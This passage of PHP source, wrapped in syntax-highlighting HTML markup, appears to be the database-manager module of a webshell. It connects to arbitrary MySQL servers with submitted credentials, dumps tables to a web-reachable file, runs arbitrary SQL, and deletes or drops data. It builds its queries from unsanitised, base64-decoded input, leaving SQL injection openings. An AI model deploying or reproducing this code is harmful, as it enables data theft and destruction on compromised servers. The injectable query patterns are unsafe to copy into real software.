#999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dbform .= \"&lt;input type=\\\"hidden\\\" id=\\\"dbname\\\" name=\\\"dbname\\\" value=\\<span style=\"text-decoration: underline;\">\"$dbname\\\" /&gt;\\n\";</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if(isset($charset)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dbform .= \"&lt;input type=\\\"hidden\\\" id=\\\"charset\\\" name=\\\"charset\\\" value<span style=\"text-decoration: underline;\">=\\\"$charset\\\" /&gt;\\n\";</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($doing == 'backupmysql' &amp;&amp; $saveasfile) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (!$table) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m('Please choose the table');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbpo<span style=\"text-decoration: underline;\">rt);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $fp = @fopen($path,'w');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($fp) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   foreach($table as $k =&gt; $v) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($v) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   sqldumptable($v, $fp);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   fclose($fp);<span style=\"color: #f99157; background-color: #515151;\">                </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $fileurl = str_replace(SA_ROOT,'',$path);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m('Database has success backup to &lt;a href=\"'.$fileurl.'\" target=<span style=\"text-decoration: underline;\">\"_blank\"&gt;'.$path.'&lt;/a&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   mysql_close();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m('Backup failed');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($insert &amp;&amp; $insertsql) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $keystr = $valstr = $tmp = '';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   foreach($insertsql as $key =&gt; $val) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($val) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $keystr .= $tmp.$key;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $valstr .= $tmp.\"'\".addslashes($val).\"'\";\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $tmp = ',';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($keystr &amp;&amp; $valstr) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbpo<span style=\"text-decoration: underline;\">rt);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m(q(\"INSERT INTO $tablename ($keystr) VALUES ($valstr)\") ? 'Insert n<span style=\"text-decoration: underline;\">ew record of success' : mysql_error());</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($update &amp;&amp; $insertsql &amp;&amp; $base64) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $valstr = $tmp = '';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   foreach($insertsql as $key =&gt; $val) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $valstr .= $tmp.$key.\"='\".addslashes($val).\"'\";\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $tmp = ',';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($valstr) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $where = base64_decode($base64);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbpo<span style=\"text-decoration: underline;\">rt);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m(q(\"UPDATE $tablename SET $valstr WHERE $where LIMIT 1\") ? 'Record <span style=\"text-decoration: underline;\">updating' : mysql_error());</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($doing == 'del' &amp;&amp; $base64) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $where = base64_decode($base64);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $delete_sql = \"DELETE FROM $tablename WHERE $where\";\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m(q(\"DELETE FROM $tablename WHERE $where\") ? 'Deletion record of success<span style=\"text-decoration: underline;\">' : mysql_error());</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($tablename &amp;&amp; $doing == 'drop') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (q(\"DROP TABLE $tablename\")) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m('Drop table of success');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $tablename = '';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m(mysql_error());\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formhead(array('title'=&gt;'MYSQL Manager'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('action','mysqladmin');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;p&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('DBHost:');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('name'=&gt;'dbhost','size'=&gt;20,'value'=&gt;$dbhost));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p(':');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('name'=&gt;'dbport','size'=&gt;4,'value'=&gt;$dbport));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('DBUser:');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('name'=&gt;'dbuser','size'=&gt;15,'value'=&gt;$dbuser));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('DBPass:');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('name'=&gt;'dbpass','size'=&gt;15,'value'=&gt;$dbpass));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('DBCharset:');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeselect(array('name'=&gt;'charset','option'=&gt;$charsetdb,'selected'=&gt;$charset<span style=\"text-decoration: underline;\">,'nokey'=&gt;1));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('name'=&gt;'connect','value'=&gt;'Connect','type'=&gt;'submit','class<span style=\"text-decoration: underline;\">'=&gt;'bt'));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/p&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formfoot();\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   //&#25805;&#20316;&#35760;&#24405;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formhead(array('name'=&gt;'recordlist'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('doing');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('action','mysqladmin');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('base64');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('tablename');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p($dbform);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formfoot();\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   //&#36873;&#23450;&#25968;&#25454;&#24211;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formhead(array('name'=&gt;'setdbname'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('action','mysqladmin');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p($dbform);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (!$dbname) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('dbname');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formfoot();\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   //&#36873;&#23450;&#34920;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formhead(array('name'=&gt;'settable'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('action','mysqladmin');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p($dbform);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('tablename');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('page',$page);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('doing');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formfoot();\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $cachetables = array();<span style=\"color: #f99157; background-color: #515151;\">     </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $pagenum = 30;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $page = intval($page);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if($page) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $start_limit = ($page - 1) * $pagenum;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $start_limit = 0;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $page = 1;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (isset($dbhost) &amp;&amp; isset($dbuser) &amp;&amp; isset($dbpass) &amp;&amp; isset($connect)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbp<span style=\"text-decoration: underline;\">ort);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   //&#33719;&#21462;&#25968;&#25454;&#24211;&#20449;&#24687;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $mysqlver = mysql_get_server_info();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;p&gt;MySQL '.$mysqlver.' running in '.$dbhost.' as '.$dbuser.'@'.$dbhos<span style=\"text-decoration: underline;\">t.'&lt;/p&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $highver = $mysqlver &gt; '4.1' ? 1 : 0;\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   //&#33719;&#21462;&#25968;&#25454;&#24211;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $query = q(\"SHOW DATABASES\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dbs = array();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dbs[] = '-- Select a database --';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   while($db = mysql_fetch_array($query)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dbs[$db['Database']] = $db['Database'];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeselect(array('title'=&gt;'Please select a database:','name'=&gt;'db[]','op<span style=\"text-decoration: underline;\">tion'=&gt;$dbs,'selected'=&gt;$dbname,'onchange'=&gt;'moddbname(this.options[this.selectedIndex].value)','newline'=&gt;1));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $tabledb = array();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($dbname) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;p&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('Current dababase: &lt;a href=\"javascript:moddbname(\\''.$dbname.'\\');<span style=\"text-decoration: underline;\">\"&gt;'.$dbname.'&lt;/a&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($tablename) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p(' | Current Table: &lt;a href=\"javascript:settable(\\''.$tablename<span style=\"text-decoration: underline;\">.'\\');\"&gt;'.$tablename.'&lt;/a&gt; [ &lt;a href=\"javascript:settable(\\''.$tablename.'\\', \\'insert\\');\"&gt;Insert&lt;/a&gt; | &lt;a href=\"javascript:settable(\\''.$tablename.'\\', \\'structure\\');\"&gt;Structure&lt;/a&gt; | &lt;a href=\"javascript:settable(\\''.$tablename.'\\', \\'drop\\');\"&gt;Drop&lt;/a&gt; ]');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/p&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   mysql_select_db($dbname);\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $getnumsql = '';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $runquery = 0;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($sql_query) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $runquery = 1;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $allowedit = 0;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($tablename &amp;&amp; !$sql_query) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $sql_query = \"SELECT * FROM $tablename\";\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $getnumsql = $sql_query;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $sql_query = $sql_query.\" LIMIT $start_limit, $pagenum\";\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $allowedit = 1;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;form action=\"'.$self.'\" method=\"POST\"&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;p&gt;&lt;table width=\"200\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"&gt;<span style=\"text-decoration: underline;\">&lt;tr&gt;&lt;td colspan=\"2\"&gt;Run SQL query/queries on database '.$dbname.':&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;textarea name=\"sql_query\" class=\"area\" style=\"width:600px;height:50px;overflow:auto;\"&gt;'.htmlspecialchars($sql_query,ENT_QUOTES).'&lt;/textarea&gt;&lt;/td&gt;&lt;td style=\"padding:0 5px;\"&gt;&lt;input class=\"bt\" style=\"height:50px;\" name=\"submit\" type=\"submit\" value=\"Query\" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('tablename', $tablename);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('action','mysqladmin');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p($dbform);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/form&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($tablename || ($runquery &amp;&amp; $sql_query)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($doing == 'structure') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $result = q(\"SHOW FULL COLUMNS FROM $tablename\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $rowdb = array();\n<span style=\"color: 